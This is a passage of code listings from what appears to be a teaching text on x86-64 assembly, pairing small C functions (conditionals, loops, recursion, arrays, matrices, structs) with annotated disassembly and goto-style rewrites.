["```\n$ uname -p\n\nx86_64\n```", "```\n#include <stdio.h>\n\n//adds two to an integer and returns the result\n\nint adder2(int a) {\n\n    return a + 2;\n\n}\n\nint main(){\n\n    int x = 40;\n\n    x = adder2(x);\n\n    printf(\"x is: %d\\n\", x);\n\n    return 0;\n\n}\n```", "```\n$ gcc -o adder adder.c\n```", "```\n$ objdump -d adder > output\n\n$ less output\n```", "```\n0000000000400526 <adder2>:\n\n  400526:       55                      push   %rbp\n\n  400527:       48 89 e5                mov    %rsp,%rbp\n\n  40052a:       89 7d fc                mov    %edi,-0x4(%rbp)\n\n  40052d:       8b 45 fc                mov    -0x4(%rbp),%eax\n\n  400530:       83 c0 02                add    $0x2,%eax\n\n  400533:       5d                      pop    %rbp\n\n  400534:       c3                      retq\n```", "```\nmov    -0x4(%rbp),%eax\n\nadd    $0x2,%eax\n```", "```\n//adds two to an integer and returns the result\n\nint adder2(int a) {\n\n    return a + 2;\n\n}\n```", "```\n0000000000400526 <adder2>:\n\n  400526:       55                      push   %rbp\n\n  400527:       48 89 e5                mov    %rsp,%rbp\n\n  40052a:       89 7d fc                mov    %edi,-0x4(%rbp)\n\n  40052d:       8b 45 fc                mov    -0x4(%rbp),%eax\n\n  400530:       83 c0 02                add    $0x2,%eax\n\n  400533:       5d                      pop    %rbp\n\n  400534:       c3                      retq\n```", "```\nsub $8, %rsp\n\nmov %rbp, (%rsp)\n```", "```\nmov (%rsp), %rbp\n\nadd $8, %rsp\n```", "```\npush %rbp\n\nmov %rsp, %rbp\n```", "```\npop %rbp\n\nretq\n```", "```\ntest %rax, %rax\n```", "```\ncmp $0, %rax\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if ( x > y ) { //if (conditional)\n\n        smallest = y; //then statement\n\n    }\n\n    else {\n\n        smallest = x; //else statement\n\n    }\n\n    return smallest;\n\n}\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if (x <= y ) { //if (!conditional)\n\n        goto else_statement;\n\n    }\n\n    smallest = y; //then statement\n\n    goto done;\n\nelse_statement:\n\n    smallest = x; //else statement\n\ndone:\n\n    return smallest;\n\n}\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if ( x > y ) {\n\n        smallest = y;\n\n    }\n\n    else {\n\n        smallest = x;\n\n    }\n\n    return smallest;\n\n}\n```", "```\n(gdb) disas getSmallest\n\nDump of assembler code for function getSmallest:\n\n   0x40059a <+4>:   mov    %edi,-0x14(%rbp)\n\n   0x40059d <+7>:   mov    %esi,-0x18(%rbp)\n\n   0x4005a0 <+10>:  mov    -0x14(%rbp),%eax\n\n   0x4005a3 <+13>:  cmp    -0x18(%rbp),%eax\n\n   0x4005a6 <+16>:  jle    0x4005b0 <getSmallest+26>\n\n   0x4005a8 <+18>:  mov    -0x18(%rbp),%eax\n\n   0x4005ae <+24>:  jmp    0x4005b9 <getSmallest+35>\n\n   0x4005b0 <+26>:  mov    -0x14(%rbp),%eax\n\n   0x4005b9 <+35>:  pop    %rbp\n\n   0x4005ba <+36>:  retq\n```", "```\n0x40059a <+4>:  mov %edi,-0x14(%rbp)          # copy x to %rbp-0x14\n\n0x40059d <+7>:  mov %esi,-0x18(%rbp)          # copy y to %rbp-0x18\n\n0x4005a0 <+10>: mov -0x14(%rbp),%eax          # copy x to %eax\n\n0x4005a3 <+13>: cmp -0x18(%rbp),%eax          # compare x with y\n\n0x4005a6 <+16>: jle 0x4005b0 <getSmallest+26> # if x<=y goto <getSmallest+26>\n\n0x4005a8 <+18>: mov -0x18(%rbp),%eax          # copy y to %eax\n\n0x4005ae <+24>: jmp 0x4005b9 <getSmallest+35> # goto <getSmallest+35>\n\n0x4005b0 <+26>: mov -0x14(%rbp),%eax          # copy x to %eax\n\n0x4005b9 <+35>: pop %rbp                      # restore %rbp (clean up stack)\n\n0x4005ba <+36>: retq                          # exit function (return %eax)\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if (x <= y) {\n\n        goto assign_x;\n\n    }\n\n    smallest = y;\n\n    goto done;\n\nassign_x:\n\n    smallest = x;\n\ndone:\n\n    return smallest;\n\n}\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if (x <= y) {\n\n smallest = x;\n\n    }\n\n    else {\n\n        smallest = y;\n\n    }\n\n    return smallest;\n\n}\n```", "```\nif (<condition>) {\n\n    <then_statement>;\n\n}\n\nelse {\n\n    <else_statement>;\n\n}\n```", "```\n    if (!<condition>) {\n\n        goto else;\n\n    }\n\n    <then_statement>;\n\n    goto done;\n\nelse:\n\n    <else_statement>;\n\ndone:\n```", "```\nint getSmallest(int x, int y) {\n\n    int smallest;\n\n    if (x > y) {     //!(x <= y)\n\n        smallest = y; //then_statement\n\n    }\n\n    else {\n\n        smallest = x; //else_statement\n\n    }\n\n    return smallest;\n\n}\n```", "```\nresult = (<condition>) ? <then_statement> : <else_statement>;\n```", "```\nint getSmallest_cmov(int x, int y) {\n\n    return x > y ? y : x;\n\n}\n```", "```\n0x4005d7 <+0>:   push   %rbp             #save %rbp\n\n0x4005d8 <+1>:   mov    %rsp,%rbp        #update %rbp\n\n0x4005db <+4>:   mov    %edi,-0x4(%rbp)  #copy x to %rbp-0x4\n\n0x4005de <+7>:   mov    %esi,-0x8(%rbp)  #copy y to %rbp-0x8\n\n0x4005e1 <+10>:  mov    -0x8(%rbp),%eax  #copy y to %eax\n\n0x4005e4 <+13>:  cmp    %eax,-0x4(%rbp)  #compare x and y\n\n0x4005e7 <+16>:  cmovle -0x4(%rbp),%eax  #if (x <=y) copy x to %eax\n\n0x4005eb <+20>:  pop    %rbp             #restore %rbp\n\n0x4005ec <+21>:  retq                    #return %eax\n```", "```\n#compiled with: gcc -O1 -o getSmallest getSmallest.c\n\n<getSmallest>:\n\n   0x400546 <+0>: cmp    %esi,%edi      #compare x and y\n\n   0x400548 <+2>: mov    %esi,%eax      #copy y to %eax\n\n   0x40054a <+4>: cmovle %edi,%eax      #if (x<=y) copy x to %eax\n\n   0x40054d <+7>: retq                  #return %eax\n```", "```\nint incrementX(int *x) {\n\n    if (x != NULL) { //if x is not NULL\n\n        return (*x)++; //increment x\n\n    }\n\n    else { //if x is NULL\n\n        return 1; //return 1\n\n    }\n\n}\n```", "```\nint incrementX2(int *x){\n\n    return x ? (*x)++ : 1;\n\n}\n```", "```\n0x4005ed <+0>:   push   %rbp\n\n0x4005ee <+1>:   mov    %rsp,%rbp\n\n0x4005f1 <+4>:   mov    %rdi,-0x8(%rbp)\n\n0x4005f5 <+8>:   cmpq   $0x0,-0x8(%rbp)\n\n0x4005fa <+13>:  je     0x40060d <incrementX+32>\n\n0x4005fc <+15>:  mov    -0x8(%rbp),%rax\n\n0x400600 <+19>:  mov    (%rax),%eax\n\n0x400602 <+21>:  lea    0x1(%rax),%ecx\n\n0x400605 <+24>:  mov    -0x8(%rbp),%rdx\n\n0x400609 <+28>:  mov    %ecx,(%rdx)\n\n0x40060b <+30>:  jmp    0x400612 <incrementX+37>\n\n0x40060d <+32>:  mov    $0x1,%eax\n\n0x400612 <+37>:  pop    %rbp\n\n0x400613 <+38>:  retq\n```", "```\nint sumUp(int n) {\n\n    //initialize total and i\n\n    int total = 0;\n\n    int i = 1;\n\n    while (i <= n) {  //while i is less than or equal to n\n\n        total += i;   //add i to total\n\n        i++;          //increment i by 1\n\n    }\n\n    return total;\n\n}\n```", "```\nDump of assembler code for function sumUp:\n\n0x400526 <+0>:   push   %rbp\n\n0x400527 <+1>:   mov    %rsp,%rbp\n\n0x40052a <+4>:   mov    %edi,-0x14(%rbp)\n\n0x40052d <+7>:   mov    $0x0,-0x8(%rbp)\n\n0x400534 <+14>:  mov    $0x1,-0x4(%rbp)\n\n0x40053b <+21>:  jmp    0x400547 <sumUp+33>\n\n0x40053d <+23>:  mov    -0x4(%rbp),%eax\n\n0x400540 <+26>:  add    %eax,-0x8(%rbp)\n\n0x400543 <+29>:  add    $0x1,-0x4(%rbp)\n\n0x400547 <+33>:  mov    -0x4(%rbp),%eax\n\n0x40054a <+36>:  cmp    -0x14(%rbp),%eax\n\n0x40054d <+39>:  jle    0x40053d <sumUp+23>\n\n0x40054f <+41>:  mov    -0x8(%rbp),%eax\n\n0x400552 <+44>:  pop    %rbp\n\n0x400553 <+45>:  retq\n```", "```\n0x400526 <+0>:  push %rbp              # save %rbp onto the stack\n\n0x400527 <+1>:  mov  %rsp,%rbp         # update the value of %rbp (new frame)\n\n0x40052a <+4>:  mov  %edi,-0x14(%rbp)  # copy n to %rbp-0x14\n\n0x40052d <+7>:  mov  $0x0,-0x8(%rbp)   # copy 0 to %rbp-0x8 (total)\n\n0x400534 <+14>: mov  $0x1,-0x4(%rbp)   # copy 1 to %rbp-0x4 (i)\n```", "```\n0x40053b <+21>:  jmp    0x400547 <sumUp+33>  # goto <sumUp+33>\n\n0x40053d <+23>:  mov    -0x4(%rbp),%eax      # copy i to %eax\n\n0x400540 <+26>:  add    %eax,-0x8(%rbp)      # add i to total (total += i)\n\n0x400543 <+29>:  add    $0x1,-0x4(%rbp)      # add 1 to i (i += 1)\n\n0x400547 <+33>:  mov    -0x4(%rbp),%eax      # copy i to %eax\n\n0x40054a <+36>:  cmp    -0x14(%rbp),%eax     # compare i to n\n\n0x40054d <+39>:  jle    0x40053d <sumUp+23>  # if (i <= n) goto <sumUp+23>\n```", "```\n0x40054f <+41>:  mov    -0x8(%rbp),%eax     # copy total to %eax\n\n0x400552 <+44>:  pop    %rbp                # restore rbp\n\n0x400553 <+45>:  retq                       # return (total)\n```", "```\n<sumUp>:\n\n  <+0>:   push   %rbp\n\n  <+1>:   mov    %rsp,%rbp\n\n  <+4>:   mov    %edi,-0x14(%rbp)\n\n  <+7>:   mov    $0x0,-0x8(%rbp)\n\n  <+14>:  mov    $0x1,-0x4(%rbp)\n\n  <+21>:  jmp    0x400547 <sumUp+33>\n\n  <+23>:  mov    -0x4(%rbp),%eax\n\n  <+26>:  add    %eax,-0x8(%rbp)\n\n  <+29>:  add    $0x1,-0x4(%rbp)\n\n  <+33>:  mov    -0x4(%rbp),%eax\n\n  <+36>:  cmp    -0x14(%rbp),%eax\n\n  <+39>:  jle    0x40053d <sumUp+23>\n\n  <+41>:  mov    -0x8(%rbp),%eax\n\n  <+44>:  pop    %rbp\n\n  <+45>:  retq\n```", "```\nint sumUp(int n) {\n\n    int total = 0;\n\n    int i = 1;\n\n    goto start;\n\nbody:\n\n    total += i;\n\n    i += 1;\n\nstart:\n\n    if (i <= n) {\n\n        goto body;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumUp(int n) {\n\n    int total = 0;\n\n    int i = 1;\n\n    while (i <= n) {\n\n        total += i;\n\n        i += 1;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumUp2(int n) {\n\n    int total = 0;             //initialize total to 0\n\n    int i;\n\n    for (i = 1; i <= n; i++) { //initialize i to 1, increment by 1 while i<=n\n\n        total += i;            //updates total by i\n\n    }\n\n    return total;\n\n}\n```", "```\nDump of assembler code for function sumUp2:\n\n0x400554 <+0>:   push   %rbp                   #save %rbp\n\n0x400555 <+1>:   mov    %rsp,%rbp              #update %rpb (new stack frame)\n\n0x400558 <+4>:   mov    %edi,-0x14(%rbp)       #copy %edi to %rbp-0x14 (n)\n\n0x40055b <+7>:   movl   $0x0,-0x8(%rbp)        #copy 0 to %rbp-0x8 (total)\n\n0x400562 <+14>:  movl   $0x1,-0x4(%rbp)        #copy 1 to %rbp-0x4 (i)\n\n0x400569 <+21>:  jmp    0x400575 <sumUp2+33>   #goto <sumUp2+33>\n\n0x40056b <+23>:  mov    -0x4(%rbp),%eax        #copy i to %eax [loop]\n\n0x40056e <+26>:  add    %eax,-0x8(%rbp)        #add i to total (total+=i)\n\n0x400571 <+29>:  addl   $0x1,-0x4(%rbp)        #add 1 to i (i++)\n\n0x400575 <+33>:  mov    -0x4(%rbp),%eax        #copy i to %eax [start]\n\n0x400578 <+36>:  cmp    -0x14(%rbp),%eax       #compare i with n\n\n0x40057b <+39>:  jle    0x40056b <sumUp2+23>   #if (i <= n) goto loop\n\n0x40057d <+41>:  mov    -0x8(%rbp),%eax        #copy total to %eax\n\n0x400580 <+44>:  pop    %rbp                   #prepare to leave the function\n\n0x400581 <+45>:  retq                          #return total\n```", "```\nfor (<initialization>; <boolean expression>; <step>){\n\n    <body>\n\n}\n```", "```\n<initialization>\n\nwhile (<boolean expression>) {\n\n    <body>\n\n    <step>\n\n}\n```", "```\nint sumUp2(int n) {\n\n    int total = 0;\n\n    int i = 1;\n\n    for (i; i <= n; i++) {\n\n        total += i;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumUp(int n){\n\n    int total = 0;\n\n    int i = 1;\n\n    while (i <= n) {\n\n        total += i;\n\n        i += 1;\n\n    }\n\n    return total;\n\n}\n```", "```\n#include <stdio.h>\n\nint assign(void) {\n\n    int y = 40;\n\n    return y;\n\n}\n\nint adder(void) {\n\n    int a;\n\n    return a + 2;\n\n}\n\nint main(void) {\n\n    int x;\n\n    assign();\n\n    x = adder();\n\n    printf(\"x is: %d\\n\", x);\n\n    return 0;\n\n}\n```", "```\n0000000000400526 <assign>:\n\n  400526:       55                      push   %rbp\n\n  400527:       48 89 e5                mov    %rsp,%rbp\n\n  40052a:       c7 45 fc 28 00 00 00    movl   $0x28,-0x4(%rbp)\n\n  400531:       8b 45 fc                mov    -0x4(%rbp),%eax\n\n  400534:       5d                      pop    %rbp\n\n  400535:       c3                      retq\n\n0000000000400536 <adder>:\n\n  400536:       55                      push   %rbp\n\n  400537:       48 89 e5                mov    %rsp,%rbp\n\n  40053a:       8b 45 fc                mov    -0x4(%rbp),%eax\n\n  40053d:       83 c0 02                add    $0x2,%eax\n\n  400540:       5d                      pop    %rbp\n\n  400541:       c3                      retq\n\n0000000000400542 <main>:\n\n  400542:       55                      push   %rbp\n\n  400543:       48 89 e5                mov    %rsp,%rbp\n\n  400546:       48 83 ec 10             sub    $0x10,%rsp\n\n  40054a:       e8 e3 ff ff ff          callq  400526 <assign>\n\n  40054f:       e8 d2 ff ff ff          callq  400536 <adder>\n\n  400554:       89 45 fc                mov    %eax,-0x4(%rbp)\n\n  400557:       8b 45 fc                mov    -0x4(%rbp),%eax\n\n  40055a:       89 c6                   mov    %eax,%esi\n\n  40055c:       bf 04 06 40 00          mov    $0x400604,%edi\n\n  400561:       b8 00 00 00 00          mov    $0x0,%eax\n\n  400566:       e8 95 fe ff ff          callq  400400 <printf@plt>\n\n  40056b:       b8 00 00 00 00          mov    $0x0,%eax\n\n  400570:       c9                      leaveq\n\n  400571:       c3                      retq\n```", "```\nint a;\n\nreturn a + 2;\n```", "```\nint printf(const char * format, ...)\n```", "```\nprintf(\"x is %d\\n\", x);\n```", "```\nmov %rbp, %rsp\n\npop %rbp\n```", "```\nint sumDown(int n) {\n\n    int total = 0;\n\n    int i = n;\n\n    while (i > 0) {\n\n        total += i;\n\n        i--;\n\n    }\n\n    return total;\n\n}\n```", "```\nint sumr(int n) {\n\n    if (n <= 0) {\n\n        return 0;\n\n    }\n\n    return n + sumr(n-1);\n\n}\n```", "```\nDump of assembler code for function sumr:\n\n0x400551 <+0>: push  %rbp                # save %rbp\n\n0x400552 <+1>: mov   %rsp,%rbp           # update %rbp (new stack frame)\n\n0x400555 <+4>: sub   $0x10,%rsp          # expand stack frame by 16 bytes\n\n0x400559 <+8>: mov   %edi,-0x4(%rbp)     # move first param (n) to %rbp-0x4\n\n0x40055c <+11>: cmp   $0x0,-0x4(%rbp)    # compare n to 0\n\n0x400560 <+15>: jg    0x400569 <sumr+24> # if (n > 0) goto <sumr+24> [body]\n\n0x400562 <+17>: mov   $0x0,%eax          # copy 0 to %eax\n\n0x400567 <+22>: jmp   0x40057d <sumr+44> # goto <sumr+44> [done]\n\n0x400569 <+24>: mov   -0x4(%rbp),%eax    # copy n to %eax (result = n)\n\n0x40056c <+27>: sub   $0x1,%eax          # subtract 1 from %eax (result -= 1)\n\n0x40056f <+30>: mov   %eax,%edi          # copy %eax to %edi\n\n0x400571 <+32>: callq 0x400551 <sumr>    # call sumr(result)\n\n0x400576 <+37>: mov   %eax,%edx          # copy returned value to %edx\n\n0x400578 <+39>: mov   -0x4(%rbp),%eax    # copy n to %eax\n\n0x40057b <+42>: add   %edx,%eax          # add sumr(result) to n\n\n0x40057d <+44>: leaveq                   # prepare to leave the function\n\n0x40057e <+45>: retq                     # return result\n```", "```\nint sumr(int n) {\n\n    int result;\n\n    if (n > 0) {\n\n        goto body;\n\n    }\n\n    result = 0;\n\n    goto done;\n\nbody:\n\n    result = n;\n\n    result -= 1;\n\n    result = sumr(result);\n\n    result += n;\n\ndone:\n\n    return result;\n\n}\n```", "```\nint sumr(int n) {\n\n    int result;\n\n    if (n <= 0) {\n\n        return 0;\n\n    }\n\n    result = sumr(n-1);\n\n    result += n;\n\n    return result;\n\n}\n```", "```\nint sumArray(int *array, int length) {\n\n    int i, total = 0;\n\n    for (i = 0; i < length; i++) {\n\n        total += array[i];\n\n    }\n\n    return total;\n\n}\n```", "```\n0x400686 <+0>: push %rbp                    # save %rbp\n\n0x400687 <+1>: mov  %rsp,%rbp               # update %rbp (new stack frame)\n\n0x40068a <+4>: mov  %rdi,-0x18(%rbp)        # copy array to %rbp-0x18\n\n0x40068e <+8>: mov  %esi,-0x1c(%rbp)        # copy length to %rbp-0x1c\n\n0x400691 <+11>: movl $0x0,-0x4(%rbp)        # copy 0 to %rbp-0x4 (total)\n\n0x400698 <+18>: movl $0x0,-0x8(%rbp)        # copy 0 to %rbp-0x8 (i)\n\n0x40069f <+25>: jmp  0x4006be <sumArray+56> # goto <sumArray+56>\n\n0x4006a1 <+27>: mov  -0x8(%rbp),%eax        # copy i to %eax\n\n0x4006a4 <+30>: cltq                        # convert i to a 64-bit integer\n\n0x4006a6 <+32>: lea  0x0(,%rax,4),%rdx      # copy i*4 to %rdx\n\n0x4006ae <+40>: mov  -0x18(%rbp),%rax       # copy array to %rax\n\n0x4006b2 <+44>: add  %rdx,%rax              # compute array+i*4, store in %rax\n\n0x4006b5 <+47>: mov  (%rax),%eax            # copy array[i] to %eax\n\n0x4006b7 <+49>: add  %eax,-0x4(%rbp)        # add %eax to total\n\n0x4006ba <+52>: addl $0x1,-0x8(%rbp)        # add 1 to i (i+=1)\n\n0x4006be <+56>: mov  -0x8(%rbp),%eax        # copy i to %eax\n\n0x4006c1 <+59>: cmp  -0x1c(%rbp),%eax       # compare i to length\n\n0x4006c4 <+62>: jl   0x4006a1 <sumArray+27> # if i<length goto <sumArray+27>\n\n0x4006c6 <+64>: mov  -0x4(%rbp),%eax        # copy total to %eax\n\n0x4006c9 <+67>: pop  %rbp                   # prepare to leave the function\n\n0x4006ca <+68>: retq                        # return total\n```", "```\n<+32>: lea 0x0(,%rax,4),%rdx       # copy i*4 to %rdx\n\n<+40>: mov -0x18(%rbp),%rax        # copy array to %rax\n\n<+44>: add %rdx,%rax               # add i*4 to array (i.e. array+i) to %rax\n\n<+47>: mov (%rax),%eax             # dereference array+i*4, place in %eax\n\n<+49>: add %eax,-0x4(%rbp)         # add %eax to total (i.e. total+=array[i])\n```", "```\n//statically allocated matrix (allocated on stack)\n\nint M1[4][3];\n\n//dynamically allocated matrix (programmer friendly, allocated on heap)\n\nint **M2, i;\n\nM2 = malloc(4 * sizeof(int*));\n\nfor (i = 0; i < 4; i++) {\n\n    M2[i] = malloc(3 * sizeof(int));\n\n}\n```", "```\n//dynamic matrix (allocated on heap, memory efficient way)\n\n#define ROWS 4\n\n#define COLS 3\n\nint *M3;\n\nM3 = malloc(ROWS * COLS * sizeof(int));\n```", "```\nint sumMat(int *m, int rows, int cols) {\n\n    int i, j, total = 0;\n\n    for (i = 0; i < rows; i++){\n\n        for (j = 0; j < cols; j++){\n\n            total += m[i*cols + j];\n\n        }\n\n    }\n\n    return total;\n\n}\n```", "```\nDump of assembler code for function sumMat:\n\n0x400686 <+0>:   push %rbp                 # save rbp\n\n0x400687 <+1>:   mov  %rsp,%rbp            # update rbp (new stack frame)\n\n0x40068a <+4>:   mov  %rdi,-0x18(%rbp)     # copy m to %rbp-0x18\n\n0x40068e <+8>:   mov  %esi,-0x1c(%rbp)     # copy rows to %rbp-0x1c\n\n0x400691 <+11>:  mov  %edx,-0x20(%rbp)     # copy cols parameter to %rbp-0x20\n\n0x400694 <+14>:  movl $0x0,-0x4(%rbp)      # copy 0 to %rbp-0x4 (total)\n\n0x40069b <+21>:  movl $0x0,-0xc(%rbp)      # copy 0 to %rbp-0xc (i)\n\n0x4006a2 <+28>:  jmp  0x4006e1 <sumMat+91> # goto <sumMat+91>\n\n0x4006a4 <+30>:  movl $0x0,-0x8(%rbp)      # copy 0 to %rbp-0x8 (j)\n\n0x4006ab <+37>:  jmp  0x4006d5 <sumMat+79> # goto <sumMat+79>\n\n0x4006ad <+39>:  mov  -0xc(%rbp),%eax      # copy i to %eax\n\n0x4006b0 <+42>:  imul -0x20(%rbp),%eax     # mult i with cols, place in %eax\n\n0x4006b4 <+46>:  mov  %eax,%edx            # copy i*cols to %edx\n\n0x4006b6 <+48>:  mov  -0x8(%rbp),%eax      # copy j to %eax\n\n0x4006b9 <+51>:  add  %edx,%eax            # add i*cols with j, place in %eax\n\n0x4006bb <+53>:  cltq                      # convert %eax to a 64-bit int\n\n0x4006bd <+55>:  lea  0x0(,%rax,4),%rdx    # mult (i*cols+j) by 4,put in %rdx\n\n0x4006c5 <+63>:  mov  -0x18(%rbp),%rax     # copy m to %rax\n\n0x4006c9 <+67>:  add  %rdx,%rax            # add m to (i*cols+j)*4,put in %rax\n\n0x4006cc <+70>:  mov  (%rax),%eax          # copy m[i*cols+j] to %eax\n\n0x4006ce <+72>:  add  %eax,-0x4(%rbp)      # add m[i*cols+j] to total\n\n0x4006d1 <+75>:  addl $0x1,-0x8(%rbp)      # add 1 to j (j++)\n\n0x4006d5 <+79>:  mov  -0x8(%rbp),%eax      # copy j to %eax\n\n0x4006d8 <+82>:  cmp  -0x20(%rbp),%eax     # compare j with cols\n\n0x4006db <+85>:  jl   0x4006ad <sumMat+39> # if (j < cols) goto <sumMat+39>\n\n0x4006dd <+87>:  addl $0x1,-0xc(%rbp)      # add 1 to i\n\n0x4006e1 <+91>:  mov  -0xc(%rbp),%eax      # copy i to %eax\n\n0x4006e4 <+94>:  cmp  -0x1c(%rbp),%eax     # compare i with rows\n\n0x4006e7 <+97>:  jl   0x4006a4 <sumMat+30> # if (i < rows) goto <sumMat+30>\n\n0x4006e9 <+99>:  mov  -0x4(%rbp),%eax      # copy total to %eax\n\n0x4006ec <+102>: pop  %rbp                 # clean up stack\n\n0x4006ed <+103>: retq                      # return total\n```", "```\n0x4006ad <+39>: mov  -0xc(%rbp),%eax    # copy i to %eax\n\n0x4006b0 <+42>: imul -0x20(%rbp),%eax   # multiply i with cols, place in %eax\n\n0x4006b4 <+46>: mov  %eax,%edx          # copy i*cols to %edx\n```", "```\n0x4006b6 <+48>: mov  -0x8(%rbp),%eax    # copy j to %eax\n\n0x4006b9 <+51>: add  %edx,%eax          # add i*cols with j, place in %eax\n\n0x4006bb <+53>: cltq                    # convert %eax to a 64-bit int\n\n0x4006bd <+55>: lea  0x0(,%rax,4),%rdx  # multiply (i*cols+j) by 4,put in %rdx\n```", "```\n0x4006c5 <+63>: mov -0x18(%rbp),%rax   # copy m to %rax\n\n0x4006c9 <+67>: add %rdx,%rax          # add m to (i*cols+j)*4, place in %rax\n\n0x4006cc <+70>: mov (%rax),%eax        # copy m[i*cols+j] to %eax\n\n0x4006ce <+72>: add %eax,-0x4(%rbp)    # add m[i*cols+j] to total\n```", "```\nint sumMatrix(int **matrix, int rows, int cols) {\n\n    int i, j, total=0;\n\n    for (i = 0; i < rows; i++) {\n\n        for (j = 0; j < cols; j++) {\n\n            total += matrix[i][j];\n\n        }\n\n    }\n\n    return total;\n\n}\n```", "```\nDump of assembler code for function sumMatrix:\n\n0x4006ee <+0>:   push   %rbp                    # save rbp\n\n0x4006ef <+1>:   mov    %rsp,%rbp               # update rbp (new stack frame)\n\n0x4006f2 <+4>:   mov    %rdi,-0x18(%rbp)        # copy matrix to %rbp-0x18\n\n0x4006f6 <+8>:   mov    %esi,-0x1c(%rbp)        # copy rows to %rbp-0x1c\n\n0x4006f9 <+11>:  mov    %edx,-0x20(%rbp)        # copy cols to %rbp-0x20\n\n0x4006fc <+14>:  movl   $0x0,-0x4(%rbp)         # copy 0 to %rbp-0x4 (total)\n\n0x400703 <+21>:  movl   $0x0,-0xc(%rbp)         # copy 0 to %rbp-0xc (i)\n\n0x40070a <+28>:  jmp    0x40074e <sumMatrix+96> # goto <sumMatrix+96>\n\n0x40070c <+30>:  movl   $0x0,-0x8(%rbp)         # copy 0 to %rbp-0x8 (j)\n\n0x400713 <+37>:  jmp    0x400742 <sumMatrix+84> # goto <sumMatrix+84>\n\n0x400715 <+39>:  mov    -0xc(%rbp),%eax         # copy i to %eax\n\n0x400718 <+42>:  cltq                           # convert i to 64-bit integer\n\n0x40071a <+44>:  lea    0x0(,%rax,8),%rdx       # mult i by 8, place in %rdx\n\n0x400722 <+52>:  mov    -0x18(%rbp),%rax        # copy matrix to %rax\n\n0x400726 <+56>:  add    %rdx,%rax               # put i*8 + matrix in %rax\n\n0x400729 <+59>:  mov    (%rax),%rax             # copy matrix[i] to %rax (ptr)\n\n0x40072c <+62>:  mov    -0x8(%rbp),%edx         # copy j to %edx\n\n0x40072f <+65>:  movslq %edx,%rdx               # convert j to 64-bit integer\n\n0x400732 <+68>:  shl    $0x2,%rdx               # mult j by 4, place in %rdx\n\n0x400736 <+72>:  add    %rdx,%rax               # put j*4 + matrix[i] in %rax\n\n0x400739 <+75>:  mov    (%rax),%eax             # copy matrix[i][j] to %eax\n\n0x40073b <+77>:  add    %eax,-0x4(%rbp)         # add matrix[i][j] to total\n\n0x40073e <+80>:  addl   $0x1,-0x8(%rbp)         # add 1 to j (j++)\n\n0x400742 <+84>:  mov    -0x8(%rbp),%eax         # copy j to %eax\n\n0x400745 <+87>:  cmp    -0x20(%rbp),%eax        # compare j with cols\n\n0x400748 <+90>:  jl     0x400715 <sumMatrix+39> # if j<cols goto<sumMatrix+39>\n\n0x40074a <+92>:  addl   $0x1,-0xc(%rbp)         # add 1 to i (i++)\n\n0x40074e <+96>:  mov    -0xc(%rbp),%eax         # copy i to %eax\n\n0x400751 <+99>:  cmp    -0x1c(%rbp),%eax        # compare i with rows\n\n0x400754 <+102>: jl     0x40070c <sumMatrix+30> # if i<rows goto<sumMatrix+30>\n\n0x400756 <+104>: mov    -0x4(%rbp),%eax         # copy total to %eax\n\n0x400759 <+107>: pop    %rbp                    # restore %rbp\n\n0x40075a <+108>: retq                           # return total\n```", "```\n0x400715 <+39>: mov  -0xc(%rbp),%eax       # copy i to %eax\n\n0x400718 <+42>: cltq                       # convert i to 64-bit integer\n\n0x40071a <+44>: lea  0x0(,%rax,8),%rdx     # multiply i by 8, place in %rdx\n\n0x400722 <+52>: mov  -0x18(%rbp),%rax      # copy matrix to %rax\n\n0x400726 <+56>: add  %rdx,%rax             # add i*8 to matrix, place in %rax\n\n0x400729 <+59>: mov  (%rax),%rax           # copy matrix[i] to %rax (pointer)\n```", "```\n0x40072c <+62>: mov    -0x8(%rbp),%edx    # copy j to %edx\n\n0x40072f <+65>: movslq %edx,%rdx          # convert j to a 64-bit integer\n\n0x400732 <+68>: shl    $0x2,%rdx          # multiply j by 4, place in %rdx\n\n0x400736 <+72>: add    %rdx,%rax          # add j*4 to matrix[i], put in %rax\n\n0x400739 <+75>: mov    (%rax),%eax        # copy matrix[i][j] to %eax\n\n0x40073b <+77>: add    %eax,-0x4(%rbp)    # add matrix[i][j] to total\n```", "```\nstruct studentT {\n\n    char name[64];\n\n    int  age;\n\n    int  grad_yr;\n\n    float gpa;\n\n};\n\nstruct studentT student;\n```", "```\nvoid initStudent(struct studentT *s, char *nm, int ag, int gr, float g) {\n\n    strncpy(s->name, nm, 64);\n\n    s->grad_yr = gr;\n\n    s->age = ag;\n\n    s->gpa = g;\n\n}\n```", "```\nDump of assembler code for function initStudent:\n\n0x4006aa <+0>:  push  %rbp                   # save rbp\n\n0x4006ab <+1>:  mov   %rsp,%rbp              # update rbp (new stack frame)\n\n0x4006ae <+4>:  sub   $0x20,%rsp             # add 32 bytes to stack frame\n\n0x4006b2 <+8>:  mov   %rdi,-0x8(%rbp)        # copy 1st param to %rbp-0x8 (s)\n\n0x4006b6 <+12>: mov   %rsi,-0x10(%rbp)       # copy 2nd param to %rpb-0x10 (nm)\n\n0x4006ba <+16>: mov   %edx,-0x14(%rbp)       # copy 3rd param to %rbp-0x14 (ag)\n\n0x4006bd <+19>: mov   %ecx,-0x18(%rbp)       # copy 4th param to %rbp-0x18 (gr)\n\n0x4006c0 <+22>: movss %xmm0,-0x1c(%rbp)      # copy 5th param to %rbp-0x1c (g)\n\n0x4006c5 <+27>: mov   -0x8(%rbp),%rax        # copy s to %rax\n\n0x4006c9 <+31>: mov   -0x10(%rbp),%rcx       # copy nm to %rcx\n\n0x4006cd <+35>: mov   $0x40,%edx             # copy 0x40 (or 64) to %edx\n\n0x4006d2 <+40>: mov   %rcx,%rsi              # copy nm to %rsi\n\n0x4006d5 <+43>: mov   %rax,%rdi              # copy s to %rdi\n\n0x4006d8 <+46>: callq 0x400460 <strncpy@plt> # call strcnpy(s->name, nm, 64)\n\n0x4006dd <+51>: mov   -0x8(%rbp),%rax        # copy s to %rax\n\n0x4006e1 <+55>: mov   -0x18(%rbp),%edx       # copy gr to %edx\n\n0x4006e4 <+58>: mov   %edx,0x44(%rax)        # copy gr to %rax+0x44 (s->grad_yr)\n\n0x4006e7 <+61>: mov   